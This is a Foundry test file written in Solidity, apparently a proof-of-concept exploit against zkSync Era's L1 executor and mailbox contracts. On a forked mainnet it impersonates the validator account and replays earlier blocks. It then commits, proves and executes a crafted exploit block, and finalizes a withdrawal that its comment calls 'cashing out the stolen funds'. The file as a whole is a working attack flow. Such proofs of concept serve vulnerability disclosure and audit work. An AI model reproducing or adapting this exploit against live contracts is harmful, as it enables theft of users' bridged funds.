// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "era-contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol";
import "era-contracts/ethereum/contracts/zksync/interfaces/IGetters.sol";
import "era-contracts/ethereum/contracts/zksync/interfaces/IMailbox.sol";

import "era-contracts/ethereum/contracts/common/libraries/UnsafeBytes.sol";

import "./ExploitData.sol";

contract PoC is ExploitData, Test {
    IExecutor immutable executor = IExecutor(ZKSYNC_VALIDATOR_TIMELOCK);
    IGetters immutable getters = IGetters(ZKSYNC_DIAMOND_PROXY);
    IMailbox immutable mailbox = IMailbox(ZKSYNC_DIAMOND_PROXY);

    /**
     * @notice Setup the exploit environment by forking mainnet at the target block
     *         and pranking the ZKSYNC_VALIDATOR_EOA.
     * @dev    The RPC_MAINNET environment variable must be set to a valid mainnet RPC url
     */
    modifier setupEnv() {
        vm.createSelectFork("mainnet", TARGET_BLOCK);
        vm.startPrank(ZKSYNC_VALIDATOR_EOA);
        _;
    }

    /**
     * @notice replay commitments and proofs for the previous blocks at our target fork block
     * @dev warning: this will make a lot of RPC calls to fetch the storage slots at the target block
     */
    function executePrevBlocks() private {
        console.log("replaying proofs for previously committed blocks...");

        resetCalldataFiles();

        for (
            bytes memory data = readNextCommitCalldata();
            data.length > 0;
            data = readNextCommitCalldata()
        ) {
            (bool success, ) = address(executor).call(data);
            require(success, "commit replay failed");
        }

        for (
            bytes memory data = readNextProveCalldata();
            data.length > 0;
            data = readNextProveCalldata()
        ) {
            (bool success, ) = address(executor).call(data);
            require(success, "prove replay failed");
        }
        
        // skip the execution delay for the previously commited blocks
        vm.warp(block.timestamp + 24 hours);

        console.log("executing previously committed blocks...");
        for (
            bytes memory data = readNextExecuteCalldata();
            data.length > 0;
            data = readNextExecuteCalldata()
        ) {
            (bool success, ) = address(executor).call(data);
            require(success, "execute replay failed");
        }
    }

    /**
     * @notice commit, prove, and execute our exploit block
     */
    function executeExploitBlock() private {
        IExecutor.StoredBlockInfo memory prevBlock = getPrevStoredBlock();
        IExecutor.CommitBlockInfo memory commitBlock = getExploitCommitBlock();
        IExecutor.StoredBlockInfo memory storedBlock = getExploitStoredBlock();
        IExecutor.ProofInput memory proofInput = getExploitProofInput();

        IExecutor.CommitBlockInfo[] memory commitBlocks = new IExecutor.CommitBlockInfo[](1);
        commitBlocks[0] = commitBlock;

        IExecutor.StoredBlockInfo[] memory storedBlocks = new IExecutor.StoredBlockInfo[](1);
        storedBlocks[0] = storedBlock;

        require(getters.getTotalBlocksCommitted() == prevBlock.blockNumber, "prev block number invalid");

        console.log("committing exploit block...");
        executor.commitBlocks(prevBlock, commitBlocks);
        console.log("proving exploit block...");
        executor.proveBlocks(prevBlock, storedBlocks, proofInput);

        // wait 24 hours for the execution delay
        vm.warp(block.timestamp + 24 hours);

        console.log("executing exploit block...");
        executor.executeBlocks(storedBlocks);
    }

    /**
     * @notice finalize the exploit withdrawal, cashing out the stolen funds
     */
    function finalizeExploitWithdrawal() private {
        console.log("balance before withdrawal: ", WITHDRAWAL_TARGET.balance);

        (
            uint256 l2Block,
            uint256 l2MessageIndex,
            uint16 l2TxNumberInBlock,
            bytes memory message,
            bytes32[] memory merkleProof
        ) = getExploitWithdrawalDetails();

        mailbox.finalizeEthWithdrawal(l2Block, l2MessageIndex, l2TxNumberInBlock, message, merkleProof);

        console.log("balance after withdrawal: ", WITHDRAWAL_TARGET.balance);
    }

    /**
     * @notice runs the full PoC
     */
    function testExploit() public setupEnv {
        executePrevBlocks();
        executeExploitBlock();
        finalizeExploitWithdrawal();
    }
}
